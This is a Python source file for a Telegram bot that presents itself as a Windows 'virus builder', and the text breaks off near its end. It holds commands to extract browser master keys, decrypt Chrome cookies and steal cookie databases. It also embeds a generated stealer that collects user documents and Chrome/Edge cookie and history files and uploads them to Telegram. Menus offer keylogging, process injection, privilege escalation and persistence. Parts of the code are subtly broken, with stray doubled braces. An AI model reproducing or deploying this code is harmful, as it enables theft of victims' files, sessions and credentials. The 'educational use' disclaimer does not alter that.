#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Telegram Virus Builder Bot - Windows Version
Advanced Malware Generation via Telegram

Features:
- Remote virus generation via Telegram commands
- Advanced payload customization
- Real-time monitoring and control
- Secure communication
- Multi-user support
- Payload delivery methods
- Windows-specific functionality
"""

import os
import sys
import json
import time
import random
import string
import base64
import hashlib
import threading
import asyncio
import zipfile
import requests
from datetime import datetime, timedelta
from typing import Dict, List, Optional
import logging

# Telegram Bot API
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Enhanced virus builder components
from enhanced_virusBuilder import EnhancedVirusBuilder, AdvancedObfuscator, AntiDetection, AdvancedPayloads, StealthMechanisms

# Database for user management
import sqlite3
from cryptography.fernet import Fernet

# Import Windows-specific modules
from cookie_graber import BrowserKeyExtractor
from cookie_processor import CookieProcessor
from decrypt_chrome_v20 import ChromeDecryptor
from handle_stealer import HandleStealer
from donpapi_config import DonPAPIConfig
from main_app import MainApp

class TelegramVirusBotWindows:
    """Main Telegram bot class for virus building on Windows"""
    
    def __init__(self, bot_token: str):
        self.bot_token = bot_token
        self.virus_builder = EnhancedVirusBuilder()
        self.obfuscator = AdvancedObfuscator()
        self.anti_detection = AntiDetection()
        self.payloads = AdvancedPayloads()
        self.stealth = StealthMechanisms()
        
        # Initialize Windows-specific modules
        self.browser_key_extractor = BrowserKeyExtractor()
        self.cookie_processor = CookieProcessor()
        self.chrome_decryptor = ChromeDecryptor()
        self.handle_stealer = HandleStealer()
        self.donpapi_config = DonPAPIConfig()
        self.main_app = MainApp()
        
        # Database setup
        self.db_path = "virus_bot_windows.db"
        self.init_database()
        
        # User sessions
        self.user_sessions = {}
        
        # Security
        self.admin_users = set()
        self.allowed_users = set()
        
        # Platform info
        self.platform = "windows"
        self.arch = "x64"  # or "arm64" for Windows ARM
        
        # Logging
        logging.basicConfig(
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            level=logging.INFO
        )
        self.logger = logging.getLogger(__name__)
        
    def init_database(self):
        """Initialize SQLite database for user management"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Users table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                is_admin BOOLEAN DEFAULT FALSE,
                is_allowed BOOLEAN DEFAULT TRUE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                total_viruses INTEGER DEFAULT 0,
                platform TEXT DEFAULT 'windows'
            )
        ''')
        
        # Viruses table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS viruses (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                filename TEXT,
                payload_options TEXT,
                persistence_options TEXT,
                obfuscation_level INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'created',
                platform TEXT DEFAULT 'windows',
                FOREIGN KEY (user_id) REFERENCES users (user_id)
            )
        ''')
        
        # Sessions table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                user_id INTEGER PRIMARY KEY,
                session_data TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users (user_id)
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def get_user_info(self, user_id: int) -> Dict:
        """Get user information from database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        user = cursor.fetchone()
        
        conn.close()
        
        if user:
            return {
                'user_id': user[0],
                'username': user[1],
                'first_name': user[2],
                'last_name': user[3],
                'is_admin': bool(user[4]),
                'is_allowed': bool(user[5]),
                'created_at': user[6],
                'last_activity': user[7],
                'total_viruses': user[8],
                'platform': user[9]
            }
        return None
    
    def update_user_activity(self, user_id: int, username: str = None, first_name: str = None, last_name: str = None):
        """Update user activity in database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Check if user exists
        cursor.execute('SELECT user_id FROM users WHERE user_id = ?', (user_id,))
        if cursor.fetchone():
            # Update existing user
            cursor.execute('''
                UPDATE users 
                SET username = COALESCE(?, username),
                    first_name = COALESCE(?, first_name),
                    last_name = COALESCE(?, last_name),
                    last_activity = CURRENT_TIMESTAMP
                WHERE user_id = ?
            ''', (username, first_name, last_name, user_id))
        else:
            # Insert new user
            cursor.execute('''
                INSERT INTO users (user_id, username, first_name, last_name, platform)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, username, first_name, last_name, self.platform))
        
        conn.commit()
        conn.close()
    
    def is_user_allowed(self, user_id: int) -> bool:
        """Check if user is allowed to use the bot"""
        user_info = self.get_user_info(user_id)
        if not user_info:
            return False
        return user_info['is_allowed']
    
    def is_user_admin(self, user_id: int) -> bool:
        """Check if user is admin"""
        user_info = self.get_user_info(user_id)
        if not user_info:
            return False
        return user_info['is_admin']
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user = update.effective_user
        user_id = user.id
        
        # Update user activity
        self.update_user_activity(user_id, user.username, user.first_name, user.last_name)
        
        # Check if user is allowed
        if not self.is_user_allowed(user_id):
            await update.message.reply_text(
                "❌ Access denied. You are not authorized to use this bot."
            )
            return
        
        welcome_text = f"""
🚀 **Welcome to Advanced Virus Builder Bot - Windows!**

Hello {user.first_name}! 👋

This bot provides advanced malware generation capabilities through Telegram for Windows systems.

**Available Commands:**
/start - Show this welcome message
/build - Start building a virus
/payloads - Show available payloads
/persistence - Show persistence options
/obfuscation - Show obfuscation levels
/history - View your virus history
/help - Show detailed help
/stats - Show your statistics
/extract_keys - Extract browser master keys
/process_cookies - Process browser cookies
/decrypt_chrome - Decrypt Chrome v20+ cookies
/steal_handles - Steal browser handles
/config - Show DonPAPI configuration
/auto_build - Auto-build and deploy virus

**Platform:** Windows {self.arch}
**Features:** Registry manipulation, Windows services, DPAPI, COM interfaces

**⚠️ Important:**
- Use only for authorized testing
- Educational purposes only
- Respect local laws and regulations

Ready to build? Use /build to start! 🔨
        """
        
        await update.message.reply_text(welcome_text, parse_mode='Markdown')
    
    async def build_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /build command"""
        user_id = update.effective_user.id
        
        if not self.is_user_allowed(user_id):
            await update.message.reply_text("❌ Access denied.")
            return
        
        # Initialize user session
        self.user_sessions[user_id] = {
            'step': 'filename',
            'filename': None,
            'payload_options': {},
            'persistence_options': {},
            'obfuscation_level': 1,
            'created_at': datetime.now(),
            'platform': self.platform
        }
        
        keyboard = [
            [InlineKeyboardButton("📁 Enter Filename", callback_data="filename")],
            [InlineKeyboardButton("🎯 Configure Payloads", callback_data="payloads")],
            [InlineKeyboardButton("🔄 Configure Persistence", callback_data="persistence")],
            [InlineKeyboardButton("🔒 Set Obfuscation", callback_data="obfuscation")],
            [InlineKeyboardButton("🚀 Build Virus", callback_data="build_virus")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🔨 **Windows Virus Builder Interface**\n\n"
            "Choose an option to configure your Windows virus:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    async def extract_keys_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /extract_keys command - Extract browser master keys"""
        user_id = update.effective_user.id
        
        if not self.is_user_allowed(user_id):
            await update.message.reply_text("❌ Access denied.")
            return
        
        await update.message.reply_text("🔑 **Extracting Browser Master Keys - Windows...**\n\nPlease wait...", parse_mode='Markdown')
        
        try:
            # Extract keys from browsers
            keys = self.browser_key_extractor.extract_all_keys()
            
            result_text = "🔑 **Browser Master Keys Extracted - Windows:**\n\n"
            
            if keys['edge']:
                result_text += f"**Edge:** ✅ Found\n"
            else:
                result_text += f"**Edge:** ❌ Not found\n"
            
            if keys['chrome']:
                result_text += f"**Chrome:** ✅ Found\n"
            else:
                result_text += f"**Chrome:** ❌ Not found\n"
            
            result_text += f"\n**Platform:** Windows {self.arch}\n"
            result_text += "\n⚠️ Keys extracted successfully!"
            
            await update.message.reply_text(result_text, parse_mode='Markdown')
            
        except Exception as e:
            await update.message.reply_text(f"❌ **Error extracting keys:**\n\n{str(e)}", parse_mode='Markdown')
    
    async def process_cookies_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /process_cookies command - Process browser cookies"""
        user_id = update.effective_user.id
        
        if not self.is_user_allowed(user_id):
            await update.message.reply_text("❌ Access denied.")
            return
        
        await update.message.reply_text("🍪 **Processing Browser Cookies - Windows...**\n\nPlease wait...", parse_mode='Markdown')
        
        try:
            result_text = "🍪 **Cookie Processing Available - Windows:**\n\n"
            result_text += "**Features:**\n"
            result_text += "• Decrypt Chrome cookies using DPAPI\n"
            result_text += "• Decrypt Edge cookies\n"
            result_text += "• Filter by hostname\n"
            result_text += "• Export to various formats\n"
            result_text += "• Windows-specific encryption handling\n\n"
            result_text += f"**Platform:** Windows {self.arch}\n"
            result_text += "**Usage:** Send database path and master key to process cookies."
            
            await update.message.reply_text(result_text, parse_mode='Markdown')
            
        except Exception as e:
            await update.message.reply_text(f"❌ **Error processing cookies:**\n\n{str(e)}", parse_mode='Markdown')
    
    async def decrypt_chrome_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /decrypt_chrome command - Decrypt Chrome v20+ cookies"""
        user_id = update.effective_user.id
        
        if not self.is_user_allowed(user_id):
            await update.message.reply_text("❌ Access denied.")
            return
        
        await update.message.reply_text("🔓 **Decrypting Chrome v20+ Cookies - Windows...**\n\nPlease wait...", parse_mode='Markdown')
        
        try:
            # Attempt to decrypt Chrome cookies
            result = self.chrome_decryptor.decrypt_chrome_key()
            
            if result:
                result_text = f"🔓 **Chrome Decryption Successful - Windows:**\n\n**Key:** `{result}`\n\n"
                result_text += f"**Platform:** Windows {self.arch}\n"
                result_text += "⚠️ Key extracted successfully!"
            else:
                result_text = "❌ **Chrome Decryption Failed - Windows:**\n\nUnable to decrypt Chrome v20+ cookies."
            
            await update.message.reply_text(result_text, parse_mode='Markdown')
            
        except Exception as e:
            await update.message.reply_text(f"❌ **Error decrypting Chrome:**\n\n{str(e)}", parse_mode='Markdown')
    
    async def steal_handles_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /steal_handles command - Steal browser handles"""
        user_id = update.effective_user.id
        
        if not self.is_user_allowed(user_id):
            await update.message.reply_text("❌ Access denied.")
            return
        
        await update.message.reply_text("🕵️ **Stealing Browser Handles - Windows...**\n\nPlease wait...", parse_mode='Markdown')
        
        try:
            # Attempt to steal browser handles
            success = self.handle_stealer.steal_all_cookies()
            
            if success:
                result_text = "🕵️ **Handle Stealing Successful - Windows:**\n\n"
                result_text += "• Chrome cookies: ✅ Stolen\n"
                result_text += "• Edge cookies: ✅ Stolen\n"
                result_text += f"• Platform: Windows {self.arch}\n\n"
                result_text += "⚠️ Cookie databases extracted successfully!"
            else:
                result_text = "❌ **Handle Stealing Failed - Windows:**\n\nNo browser processes found or access denied."
            
            await update.message.reply_text(result_text, parse_mode='Markdown')
            
        except Exception as e:
            await update.message.reply_text(f"❌ **Error stealing handles:**\n\n{str(e)}", parse_mode='Markdown')
    
    async def config_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /config command - Show DonPAPI configuration"""
        user_id = update.effective_user.id
        
        if not self.is_user_allowed(user_id):
            await update.message.reply_text("❌ Access denied.")
            return
        
        try:
            # Get configuration
            config = self.donpapi_config.get_config_dict()
            
            result_text = "⚙️ **DonPAPI Configuration - Windows:**\n\n"
            result_text += f"**Share:** `{config['secretsdump']['share']}`\n"
            result_text += f"**Remote Path:** `{config['secretsdump']['remote_filepath']}`\n"
            result_text += f"**Filename Regex:** `{config['secretsdump']['filename_regex']}`\n"
            result_text += f"**File Extension:** `{config['secretsdump']['file_extension']}`\n\n"
            result_text += f"**Platform:** Windows {self.arch}\n\n"
            
            # Validate configuration
            if self.donpapi_config.validate_config():
                result_text += "✅ Configuration is valid"
            else:
                result_text += "❌ Configuration is invalid"
            
            await update.message.reply_text(result_text, parse_mode='Markdown')
            
        except Exception as e:
            await update.message.reply_text(f"❌ **Error getting configuration:**\n\n{str(e)}", parse_mode='Markdown')
    
    async def auto_build_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /auto_build command - Auto-build and deploy virus"""
        user_id = update.effective_user.id
        
        if not self.is_user_allowed(user_id):
            await update.message.reply_text("❌ Access denied.")
            return
        
        await update.message.reply_text("🚀 **Auto-Building Windows Virus...**\n\nPlease wait...", parse_mode='Markdown')
        
        try:
            # Generate virus filename with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            virus_name = f"built_virus_windows_{timestamp}"
            
            # Create auto-executing virus
            virus_code = self.create_auto_executing_virus()
            
            # Save to dist folder
            dist_folder = os.path.join(os.path.dirname(__file__), "..", "dist")
            os.makedirs(dist_folder, exist_ok=True)
            virus_path = os.path.join(dist_folder, f"{virus_name}.py")
            
            with open(virus_path, 'w', encoding='utf-8') as f:
                f.write(virus_code)
            
            # Save to database
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO viruses (user_id, filename, payload_options, persistence_options, obfuscation_level, platform, status)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                user_id, 
                virus_name, 
                json.dumps({"auto_execute": True}), 
                json.dumps({"telegram_exfil": True}), 
                5, 
                self.platform,
                'created'
            ))
            
            # Update user virus count
            cursor.execute('UPDATE users SET total_viruses = total_viruses + 1 WHERE user_id = ?', (user_id,))
            
            conn.commit()
            conn.close()
            
            result_text = f"""
✅ **Windows Virus Built Successfully!**

📁 **Filename:** {virus_name}
🎯 **Platform:** Windows {self.arch}
🔒 **Obfuscation:** Level 5/5
📤 **Features:** Auto-execute, Data exfiltration, Telegram delivery

📂 **File Created:** {virus_path}

⚠️ **Remember:** Use responsibly and only for authorized testing!
            """
            
            await update.message.reply_text(result_text, parse_mode='Markdown')
            
        except Exception as e:
            await update.message.reply_text(f"❌ **Error building virus:**\n\n{str(e)}", parse_mode='Markdown')
    
    def create_auto_executing_virus(self):
        """Create auto-executing virus with data exfiltration"""
        virus_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Auto-Executing Virus - Windows
Generated by Virus Builder
"""

import os
import sys
import json
import zipfile
import requests
import threading
import time
import base64
import subprocess
import winreg
import ctypes
from datetime import datetime
from pathlib import Path

# Configuration
TELEGRAM_BOT_TOKEN = "{self.bot_token}"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"

class AutoVirus:
    def __init__(self):
        self.data_folder = os.path.join(os.environ.get('TEMP', 'C:\\\\temp'), 'virus_data')
        os.makedirs(self.data_folder, exist_ok=True)
        
    def collect_data(self):
        """Collect system and user data"""
        data = {{
            'timestamp': datetime.now().isoformat(),
            'platform': 'windows',
            'system_info': {{
                'hostname': os.environ.get('COMPUTERNAME', 'unknown'),
                'username': os.environ.get('USERNAME', 'unknown'),
                'user_profile': os.environ.get('USERPROFILE', 'unknown'),
                'os': subprocess.check_output(['ver']).decode().strip()
            }},
            'files': self.collect_files(),
            'browser_data': self.collect_browser_data(),
            'network_info': self.collect_network_info(),
            'registry_data': self.collect_registry_data()
        }}
        
        return data
    
    def collect_files(self):
        """Collect important files"""
        files = []
        important_paths = [
            os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Documents'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Downloads')
        ]
        
        for path in important_paths:
            if os.path.exists(path):
                for root, dirs, filenames in os.walk(path):
                    for filename in filenames[:10]:  # Limit to 10 files per directory
                        file_path = os.path.join(root, filename)
                        try:
                            if os.path.getsize(file_path) < 1024 * 1024:  # Less than 1MB
                                with open(file_path, 'rb') as f:
                                    content = f.read()
                                files.append({{
                                    'path': file_path,
                                    'content': base64.b64encode(content).decode('utf-8')
                                }})
                        except:
                            continue
        
        return files
    
    def collect_browser_data(self):
        """Collect browser data"""
        browser_data = {{}}
        
        # Chrome
        chrome_path = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default')
        if os.path.exists(chrome_path):
            browser_data['chrome'] = {{
                'path': chrome_path,
                'cookies': self.get_cookie_file(chrome_path, 'Cookies'),
                'history': self.get_cookie_file(chrome_path, 'History')
            }}
        
        # Edge
        edge_path = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default')
        if os.path.exists(edge_path):
            browser_data['edge'] = {{
                'path': edge_path,
                'cookies': self.get_cookie_file(edge_path, 'Cookies'),
                'history': self.get_cookie_file(edge_path, 'History')
            }}
        
        return browser_data
    
    def get_cookie_file(self, browser_path, filename):
        """Get browser cookie/history file"""
        file_path = os.path.join(browser_path, filename)
        if os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as f:
                    return base64.b64encode(f.read()).decode('utf-8')
            except:
                return None
        return None
    
    def collect_network_info(self):
        """Collect network information"""
        try:
            result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
            return result.stdout
        except:
            return "Network info unavailable"
    
    def collect_registry_data(self):
        """Collect registry data"""
        registry_data = {{}}
        try:
            # Get some registry keys
            key_paths = [
                r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
            ]
            
            for key_path in key_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    registry_data[key_path] = self.enumerate_registry_key(key)
                    winreg.CloseKey(key)
                except:
                    continue
        except:
            pass
        
        return registry_data
    
    def enumerate_registry_key(self, key):
        """Enumerate registry key values"""
        values = {{}}
        try:
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    values[name] = str(value)
                    i += 1
                except WindowsError:
                    break
        except:
            pass
        return values
    
    def compress_and_send(self, data):
        """Compress data and send via Telegram"""
        try:
            # Save data to JSON file
            data_file = os.path.join(self.data_folder, 'collected_data.json')
            with open(data_file, 'w') as f:
                json.dump(data, f, indent=2)
            
            # Create ZIP file
            zip_file = os.path.join(self.data_folder, 'exfiltrated_data.zip')
            with zipfile.ZipFile(zip_file, 'w') as zf:
                zf.write(data_file, 'collected_data.json')
            
            # Send via Telegram
            self.send_to_telegram(zip_file)
            
        except Exception as e:
            print(f"Error compressing/sending data: {{e}}")
    
    def send_to_telegram(self, file_path):
        """Send file to Telegram"""
        try:
            url = f"https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/sendDocument"
            
            with open(file_path, 'rb') as f:
                files = {{'document': f}}
                data = {{'chat_id': TELEGRAM_CHAT_ID}}
                
                response = requests.post(url, files=files, data=data)
                
                if response.status_code == 200:
                    print("Data sent to Telegram successfully")
                else:
                    print(f"Failed to send data: {{response.status_code}}")
                    
        except Exception as e:
            print(f"Error sending to Telegram: {{e}}")
    
    def run(self):
        """Main execution"""
        print("Starting data collection...")
        
        # Collect data
        data = self.collect_data()
        
        # Compress and send
        self.compress_and_send(data)
        
        print("Data exfiltration completed")

if __name__ == "__main__":
    virus = AutoVirus()
    virus.run()
'''
        return virus_code
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callbacks"""
        query = update.callback_query
        user_id = query.from_user.id
        
        if not self.is_user_allowed(user_id):
            await query.answer("❌ Access denied.")
            return
        
        await query.answer()
        
        if query.data == "filename":
            await self.handle_filename_input(query)
        elif query.data == "payloads":
            await self.handle_payloads_selection(query)
        elif query.data == "persistence":
            await self.handle_persistence_selection(query)
        elif query.data == "obfuscation":
            await self.handle_obfuscation_selection(query)
        elif query.data == "build_virus":
            await self.handle_virus_building(query)
        elif query.data.startswith("payload_"):
            await self.handle_payload_toggle(query)
        elif query.data.startswith("persistence_"):
            await self.handle_persistence_toggle(query)
        elif query.data.startswith("obfuscation_"):
            await self.handle_obfuscation_set(query)
    
    async def handle_filename_input(self, query):
        """Handle filename input"""
        await query.edit_message_text(
            "📁 **Enter Windows Virus Filename**\n\n"
            "Please send the filename (without extension) for your Windows virus.\n"
            "Example: `windows_virus` or `test_payload`",
            parse_mode='Markdown'
        )
    
    async def handle_payloads_selection(self, query):
        """Handle payloads selection"""
        user_id = query.from_user.id
        session = self.user_sessions.get(user_id, {{}})
        payload_options = session.get('payload_options', {{}})
        
        keyboard = []
        payloads = [
            ('keylogger', '🔑 Keylogger'),
            ('screenshot', '📸 Screen Capture'),
            ('network_scan', '🌐 Network Scanner'),
            ('privilege_esc', '⬆️ Privilege Escalation'),
            ('data_exfil', '📤 Data Exfiltration'),
            ('dll_hijack', '🎭 DLL Hijacking'),
            ('process_inject', '💉 Process Injection'),
            ('registry_manip', '📝 Registry Manipulation'),
            ('service_install', '⚙️ Service Installation')
        ]
        
        for payload_id, payload_name in payloads:
            status = "✅" if payload_options.get(payload_id, False) else "❌"
            keyboard.append([InlineKeyboardButton(
                f"{{status}} {{payload_name}}", 
                callback_data=f"payload_{{payload_id}}"
            )])
        
        keyboard.append([InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🎯 **Select Windows Payloads**\n\n"
            "Choose which payloads to include in your Windows virus:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    async def handle_persistence_selection(self, query):
        """Handle persistence selection"""
        user_id = query.from_user.id
        session = self.user_sessions.get(user_id, {{}})
        persistence_options = session.get('persistence_options', {{}})
        
        keyboard = []
        persistence_methods = [
            ('registry', '📝 Registry Persistence'),
            ('service', '⚙️ Service Installation'),
            ('startup', '🚀 Startup Folder'),
            ('scheduled_task', '⏰ Scheduled Task'),
            ('wmi', '🔧 WMI Event')
        ]
        
        for method_id, method_name in persistence_methods:
            status = "✅" if persistence_options.get(method_id, False) else "❌"
            keyboard.append([InlineKeyboardButton(
                f"{{status}} {{method_name}}", 
                callback_data=f"persistence_{{method_id}}"
            )])
        
        keyboard.append([InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🔄 **Select Windows Persistence Methods**\n\n"
            "Choose how your Windows virus will persist on the system:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    async def handle_obfuscation_selection(self, query):
        """Handle obfuscation selection"""
        user_id = query.from_user.id
        session = self.user_sessions.get(user_id, {{}})
        current_level = session.get('obfuscation_level', 1)
        
        keyboard = []
        for level in range(1, 6):
            status = "✅" if level == current_level else "❌"
            keyboard.append([InlineKeyboardButton(
                f"{{status}} Level {{level}}", 
                callback_data=f"obfuscation_{{level}}"
            )])
        
        keyboard.append([InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🔒 **Select Obfuscation Level - Windows**\n\n"
            f"Current level: **{{current_level}}/5**\n\n"
            "Choose the obfuscation level for your Windows virus:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    async def handle_payload_toggle(self, query):
        """Handle payload toggle"""
        user_id = query.from_user.id
        payload_id = query.data.split('_')[1]
        
        if user_id not in self.user_sessions:
            self.user_sessions[user_id] = {{'payload_options': {{}}}}
        
        if 'payload_options' not in self.user_sessions[user_id]:
            self.user_sessions[user_id]['payload_options'] = {{}}
        
        # Toggle payload
        current_value = self.user_sessions[user_id]['payload_options'].get(payload_id, False)
        self.user_sessions[user_id]['payload_options'][payload_id] = not current_value
        
        # Refresh payloads selection
        await self.handle_payloads_selection(query)
    
    async def handle_persistence_toggle(self, query):
        """Handle persistence toggle"""
        user_id = query.from_user.id
        method_id = query.data.split('_')[1]
        
        if user_id not in self.user_sessions:
            self.user_sessions[user_id] = {{'persistence_options': {{}}}}
        
        if 'persistence_options' not in self.user_sessions[user_id]:
            self.user_sessions[user_id]['persistence_options'] = {{}}
        
        # Toggle persistence method
        current_value = self.user_sessions[user_id]['persistence_options'].get(method_id, False)
        self.user_sessions[user_id]['persistence_options'][method_id] = not current_value
        
        # Refresh persistence selection
        await self.handle_persistence_selection(query)
    
    async def handle_obfuscation_set(self, query):
        """Handle obfuscation level setting"""
        user_id = query.from_user.id
        level = int(query.data.split('_')[1])
        
        if user_id not in self.user_sessions:
            self.user_sessions[user_id] = {{}}
        
        self.user_sessions[user_id]['obfuscation_level'] = level
        
        # Refresh obfuscation selection
        await self.handle_obfuscation_selection(query)
    
    async def handle_virus_building(self, query):
        """Handle virus building process"""
        user_id = query.from_user.id
        session = self.user_sessions.get(user_id, {{}})
        
        if not session.get('filename'):
            await query.edit_message_text(
                "❌ **Error**\n\nPlease set a filename first!",
                parse_mode='Markdown'
            )
            return
        
        await query.edit_message_text(
            "🔨 **Building Windows Virus...**\n\n"
            "Please wait while your Windows virus is being generated...",
            parse_mode='Markdown'
        )
        
        try:
            # Build virus using enhanced builder
            filename = session['filename']
            payload_options = session.get('payload_options', {{}})
            persistence_options = session.get('persistence_options', {{}})
            obfuscation_level = session.get('obfuscation_level', 1)
            
            # Create virus code
            virus_code = self.virus_builder.create_advanced_header()
            virus_code += self.virus_builder.create_advanced_payloads(payload_options)
            
            # Add Windows-specific persistence
            if persistence_options.get('registry', False):
                virus_code += self.stealth.registry_persistence()
            if persistence_options.get('service', False):
                virus_code += self.stealth.service_installation()
            
            # Add main loop
            virus_code += """
:main_loop
timeout /t 30 /nobreak >nul
goto :main_loop
"""
            
            # Apply obfuscation
            if obfuscation_level >= 2:
                virus_code = self.virus_builder.obfuscate_final_code(virus_code)
            
            # Create PowerShell wrapper
            ps_wrapper = self.virus_builder.create_powershell_wrapper(virus_code, filename)
            
            # Save files
            downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
            batch_file = os.path.join(downloads_folder, f"{{filename}}.bat")
            ps_file = os.path.join(downloads_folder, f"{{filename}}.ps1")
            
            with open(batch_file, 'w', encoding='utf-8') as f:
                f.write(virus_code)
            
            with open(ps_file, 'w', encoding='utf-8') as f:
                f.write(ps_wrapper)
            
            # Save to database
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO viruses (user_id, filename, payload_options, persistence_options, obfuscation_level, platform, status)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                user_id, 
                filename, 
                json.dumps(payload_options), 
                json.dumps(persistence_options), 
                obfuscation_level, 
                self.platform,
                'created'
            ))
            
            # Update user virus count
            cursor.execute('UPDATE users SET total_viruses = total_viruses + 1 WHERE user_id = ?', (user_id,))
            
            conn.commit()
            conn.close()
            
            # Send success message
            payload_count = sum(payload_options.values())
            persistence_count = sum(persistence_options.values())
            
            success_text = f"""
✅ **Windows Virus Built Successfully!**

📁 **Filename:** {{filename}}
🎯 **Payloads:** {{payload_count}} enabled
🔄 **Persistence:** {{persistence_count}} methods
🔒 **Obfuscation:** Level {{obfuscation_level}}/5
🖥️ **Platform:** Windows {{self.arch}}

📂 **Files Created:**
- {{batch_file}}
- {{ps_file}}

⚠️ **Remember:** Use responsibly and only for authorized testing!
            """
            
            await query.edit_message_text(success_text, parse_mode='Markdown')
            
            # Clear session
            if user_id in self.user_sessions:
                del self.user_sessions[user_id]
                
        except Exception as e:
            await query.edit_message_text(
                f"❌ **Error Building Windows Virus**\n\n{{str(e)}}",
                parse_mode='Markdown'
            )
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages"""
        user_id = update.effective_user.id
        
        if not self.is_user_allowed(user_id):
            await update.message.reply_text("❌ Access denied.")
            return
        
        # Check if user is in filename input mode
        if user_id in self.user_sessions and self.user_sessions[user_id].get('step') == 'filename':
            filename = update.message.text.strip()
            
            if not filename:
                await update.message.reply_text("❌ Please enter a valid filename.")
                return
            
            # Update session
            self.user_sessions[user_id]['filename'] = filename
            self.user_sessions[user_id]['step'] = 'configured'
            
            # Show configuration menu
            keyboard = [
                [InlineKeyboardButton("🎯 Configure Payloads", callback_data="payloads")],
                [InlineKeyboardButton("🔄 Configure Persistence", callback_data="persistence")],
                [InlineKeyboardButton("🔒 Set Obfuscation", callback_data="obfuscation")],
                [InlineKeyboardButton("🚀 Build Virus", callback_data="build_virus")]
            ]
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                f"✅ **Filename Set:** {{filename}}\n\n"
                "Now configure your Windows virus options:",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                "❓ Use /build to start building a Windows virus or /help for more information."
            )
    
    def run(self):
        """Run the Telegram bot"""
        # Create application
        application = Application.builder().token(self.bot_token).build()
        
        # Add command handlers
        application.add_handler(CommandHandler("start", self.start_command))
        application.add_handler(CommandHandler("build", self.build_command))
        application.add_handler(CommandHandler("extract_keys", self.extract_keys_command))
        application.add_handler(CommandHandler("process_cookies", self.process_cookies_command))
        application.add_handler(CommandHandler("decrypt_chrome", self.decrypt_chrome_command))
        application.add_handler(CommandHandler("steal_handles", self.steal_handles_command))
        application.add_handler(CommandHandler("config", self.config_command))
        application.add_handler(CommandHandler("auto_build", self.auto_build_command))
        
        # Add callback query handler
        application.add_handler(CallbackQueryHandler(self.button_callback))
        
        # Add message handler
